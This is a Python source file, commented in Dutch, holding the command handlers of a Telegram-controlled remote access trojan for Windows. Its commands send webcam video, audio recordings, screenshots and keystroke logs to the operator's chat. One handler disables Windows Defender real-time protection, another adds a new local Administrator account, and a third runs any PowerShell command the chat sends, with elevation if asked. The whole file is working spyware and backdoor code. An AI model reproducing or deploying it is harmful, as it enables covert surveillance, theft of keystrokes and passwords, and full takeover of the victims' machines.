# Deze file bevat alle commands die via telegram chat uitgevoerd kunnen worden
from telegram import Update
from telegram.ext import ContextTypes
from molecules import *


async def startup_functions(app, id):
    """
    - functies die aangeroepen worden m.b.v app.post_init
    - deze functies worden zonder slash commands uitgevoerd
    - ze worden uitgevoerd zodra de bot opstart
    """
    # stuur de banner naar de chat als de bot online staat
    await app.bot.send_message(chat_id=id, text=f"```\n{get_banner()}\n```", parse_mode="MarkdownV2")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    gebruikt get_command_list() om een lijst van alle commands te sturen die de bot kan uitvoeren
    """
    await update.message.reply_text(get_command_list())

async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - De bot accepteerd alleen slash commands
    - bij alles dat geen slash command is geeft de bot deze reactie
    """
    await update.message.reply_text("Ik reageer alleen op slash commands. Gebruik /help voor een overzicht van alle commands.")

async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - stuurt een bericht dat webcam recording begonnen is
    - maakt een webcam recording m.b.v get_camRecording()
    - en stuurt de opname naar de chat
    """
    # meld dat cam recording begonnen is
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Webcam opname is begonnen...")
    # start recording
    # Source: https://stackoverflow.com/questions/47615956/send-video-through-telegram-python-api
    await context.bot.send_video(
        chat_id=update.effective_chat.id,
        video=open(get_camRecording(), 'rb'),
        supports_streaming=True
    )

async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - maakt een screenshot van de main screen
    - en stuurt de image naar de chat
    """
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(get_screenshot(), 'rb'),
        caption='Screenshot of the main screen'
    )

async def keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - stuurt een bericht dat key logging begonnen is
    - stuurt een string van de keys naar de chat
    - stuurt ook een screenshot van het scherm waar getyped werd
    """
    await context.bot.send_message(chat_id=update.effective_chat.id, text="key logging is begonnen...")
    string = get_loggedKeys()
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(get_screenshot(), 'rb'),
        caption=f'string:   {string}'
    )

async def audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - stuurt een bericht dat audio recording begonnen is
    - maakt een audio recording m.b.v get_audioFile()
    - en stuurt de opname naar de chat
    """
    # meld dat audio recording begonnen is
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Audio opname is begonnen...")
    await context.bot.send_voice(
        chat_id=update.effective_chat.id,
        voice=open(get_audioFile(), 'rb'),
    )

async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - run een powershell command om windows defender uit te schakelen
    - run een command om te controleren als windows defender uit of aan staat
    - return de powershell output om te zien als de command wel of niet was uitgevoerd
    """
    run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true', True)
    # meld dat Windows defender uit is
    commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
    await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

async def newuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - maak een nieuwe windows user aan
      - eerste argument is de username
      - tweede argument is de password
    """
    if len(context.args) == 2 :
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Command wordt uitgevoerd...")
    else:
        await update.message.reply_text("Geef een username en password mee als je de command aanroept")
        return

    try:
        add_new_user = f'''
        $Password = ConvertTo-SecureString -AsPlainText "{context.args[1]}" -Force;
        New-LocalUser -Name "{context.args[0]}" -Password $Password;
        Add-LocalGroupMember -Group "Administrators" -Member "{context.args[0]}";
        '''
        run_powershell_command(add_new_user, True)
        
        commandOutput = run_powershell_command(f'Get-LocalGroupMember -Group "Administrators" | Where-Object Name -eq "{context.args[0]}"')
        await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

    except ValueError:
        await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")

async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - run een custom powershell command
    - custom commands moet je zelf typen via telegram chat
    - return de powershell output om te zien als de command wel of niet was uitgevoerd\n
    als er geen output is was het waarschijnlijk successvol\n
    run deze command opnieuw met een command die kan controleren als dat wel zo was\n
    """
    # spaties na de command zorgen ervoor dat de command als losse list items opgeslagen worden in context.args
    # maak een een list met maar 2 argumenten, waarvan de eerste aangeeft als admin rechtenb nodig zijn
    args = command_list(context.args)

    if len(context.args) < 1:
        await update.message.reply_text("Geef tenimste 1 argument nadat je de command aanroept")
        return
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Command wordt uitgevoerd...")
    
    try:
        if len(args) == 1:
            commandOutput = run_powershell_command(args[0])
            await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
        elif len(args) == 2 and args[0] == "-admin":
            commandOutput = run_powershell_command(args[1], True)
            await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
    except ValueError:
        await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")

async def log_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    De functie geeft aan bij welke update er een fout veroorzaakte en toont de bijbehorende foutmelding
    """
    print(f'Update {update} caused error {context.error}')
